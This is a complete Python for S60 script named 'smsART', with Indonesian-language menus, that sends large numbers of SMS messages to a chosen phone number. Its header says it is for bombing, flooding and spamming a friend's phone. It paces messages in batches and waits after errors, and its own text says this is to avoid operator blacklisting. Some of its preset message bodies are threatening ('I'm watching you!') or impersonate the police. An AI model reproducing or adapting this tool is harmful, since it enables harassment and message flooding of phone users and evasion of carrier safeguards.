#
# smsART (bomb | flood | spamm) v0.1 beta testing
#
# This is a very basic coding. Only use looping function
# to send many messages in one click.
#
# use for bombing, flooding and spamming your friend mobile phone.
#
# just that!
#
# wrote on January 2011
#
#



import appuifw
import e32
import messaging
import sys




DEFAULTBODY=["This is a blank messages!",
             "foo bar",
             "Hello world!",
             "Hey, it's work!",
             "Hello, this is a messages body!",
             "I'm your worst nightmare!",
             "I'm watching you!",
             "Oh, wow!  Look at the moon!",
             "this handset was nicked, buying or selling is a crime. The police."]


runART=e32.Ao_lock()



def help_():
    appuifw.app.title=u"ART HELP!"
    help_msg="""
:::smsART HELP!

Tekan OPTIOS, pilih Send ART! kemudian ikuti langkah-langkahnya.

Hanya itu!
"""
    appuifw.app.body.clear()
    BODYTEXT.add(u"%s"%help_msg)
    BODYTEXT.set_pos(0)
    
    
    
def about_():
    appuifw.app.title=u"ART ABOUT!"
    about_msg="""
:::ART ABOUT

smsART v0.1 beta testing

Digunakan untuk bomb sms, flood sms dan spamm sms a.k.a perang sms!.

Ditulis menggunakan Python for s60 v1.4.5 final. Dicoba menggunakan Nokia N-Gage QD (s60 v6.1)

Oleh: pankote <pankote@rocketmail.com>
Info: http://pankote.wen.ru/konten/umum/smsART
"""
    appuifw.app.body.clear()
    BODYTEXT.add(u"%s"%about_msg)
    BODYTEXT.set_pos(0)
    
    
    
def doEXIT():
    appuifw.app.title=u"Keluar..."
    BODYTEXT.add(u"\n\nMenutup program...")
    e32.ao_sleep(2)
    runART.signal()
    
    
    
def insTARGET():
    global TARGET
    appuifw.app.title=u"Creating ART profile"
    tnum=appuifw.query(u"Nomor target:","text")
    if tnum:
        TARGET=tnum
        insBODY()
    else:
        appuifw.note(u"Perang dibatalkan!","conf")
        
        
        
def insBODY():
    global BODY
    mbody=appuifw.query(u"Isi pesan:","text")
    if mbody:
        BODY=mbody
        insCOUNT()
    else:
        if appuifw.query(u"Tidak ada isi pesan.\nPilih isi pesan bawaan ?","query")==True:
            cbody=[u"Pakai blank",
                   u"Pakai foo bar",
                   u"Pakai hello world!",
                   u"Pakai it's work!",
                   u"Pakai messages body",
                   u"Pakai worst nightmare",
                   u"Pakai watching you",
                   u"Pakai look the moon",
                   u"this handset was nicked"]
            bmenu=appuifw.popup_menu(cbody,u"Pilih isi pesan:")
            if bmenu!=None:
                appuifw.note(u"Tekan OK untuk menggunakan atau CANCEL untuk memilih lagi...","info")
                rvbody=appuifw.query(u"%s"%DEFAULTBODY[bmenu],"query")
                if rvbody:
                    BODY=DEFAULTBODY[bmenu]
                    insCOUNT()
                else:
                    insBODY()
            else:
                appuifw.note(u"Perang dibatalkan!","conf")
        else:
            appuifw.note(u"Perang dibatalkan!","conf")
            
            
            
def insCOUNT():
    global QUANTITY
    icount=appuifw.query(u"Jumlah kiriman:","number")
    if icount:
        QUANTITY=icount
        doART()
    else:
        appuifw.note(u"Perang dibatalkan!","conf")
        
        
        
def doART():
    appuifw.app.title=u"Executing profile"
    appuifw.app.body.clear()
    lcount=0
    lbreak=9
    BODYTEXT.add(u"Menjalankan profile...\n*****************\n")
    while lcount<QUANTITY:
        try:
            if lcount==lbreak:
                BODYTEXT.add(u"\n\nBatas pengiriman paket terdeteksi")
                BODYTEXT.add(u"\nProses di hentikan #17 detik")
                BODYTEXT.add(u"\nMohon tunggu...")
                BODYTEXT.add(u"\n\nWaktu: ")
                cndwn=1
                while cndwn <= 17:
                    BODYTEXT.add(u"%s, "%cndwn)
                    e32.ao_sleep(1)
                    cndwn+=1
                BODYTEXT.add(u"\n\nMengirim ulang paket #%s..."%lcount)
                e32.ao_sleep(3)
                messaging.sms_send(u"%s"%TARGET,u"%s"%BODY)
                BODYTEXT.add(u"\nPaket #%s terkirim!"%lcount)
                lbreak+=9
            else:
                BODYTEXT.add(u"\nMengirim paket #%s..."%lcount)
                e32.ao_sleep(3)
                messaging.sms_send(u"%s"%TARGET,u"%s"%BODY)
                BODYTEXT.add(u"\nPaket #%s terkirim!"%lcount)
        except:
            try:
                BODYTEXT.add(u"\n\nError saat mengirim paket #%s\n"%lcount)
                type,errs=sys.exc_info()[:2]
                BODYTEXT.add(unicode(str(type)+": "+str(errs)))
                BODYTEXT.add(u"\nUntuk menghindari blacklist dari operator, proses dihentikan selama #5 menit (#300 detik)")
                BODYTEXT.add(u"\nMohon tunggu...\n\nWaktu: ")
                countdown=1
                while countdown<=300:
                    e32.ao_sleep(1)
                    BODYTEXT.add(u"%s, "%countdown)
                    countdown+=1
                BODYTEXT.add(u"\n\nMengirim ulang paket #%s..."%lcount)
                e32.ao_sleep(3)
                messaging.sms_send(u"%s"%TARGET,u"%s"%BODY)
                BODYTEXT.add(u"\nPaket #%s terkirim!"%lcount)
            except:
                BODYTEXT.add(u"\n\nFatal error!\n")
                type,errs=sys.exc_info() [:2]
                BODYTEXT.add(unicode(str(type)+": "+str(errs)))
                BODYTEXT.add(u"\nProgram dihentikan!")
                break
        lcount+=1
    BODYTEXT.add(u"\n\n-----------------")
    BODYTEXT.add(u"\nSELESAI!")
    BODYTEXT.add(u"\n#%s dari #%s paket dikirim ke %s"%(lcount,QUANTITY,TARGET))
    appuifw.app.title=u"Job DONE!"
    
    
    
    
appuifw.app.title=u".xX smsART Xx."
appuifw.app.exit_key_handler=doEXIT
appuifw.app.menu=[(u"[>] Send ART!",insTARGET),
                  (u"[?] Bantuan",help_),
                  (u"[*] Tentang",about_),
                  (u"[X] Keluar",doEXIT)]
BODYTEXT=appuifw.Text()
BODYTEXT.add(u"Selamat datang di smsART 0.1 Beta!")
BODYTEXT.add(u"\n\nDisini kamu akan bersenang-senang dengan SMS gratis yang diberikan oleh operator.\nApa saja itu? BOMBsms, SPAMMsms dan FLOODsms")
BODYTEXT.add(u"\n\nTekan OPTIONS untuk memulai, :)")
appuifw.app.body=BODYTEXT

runART.wait()


# EOF

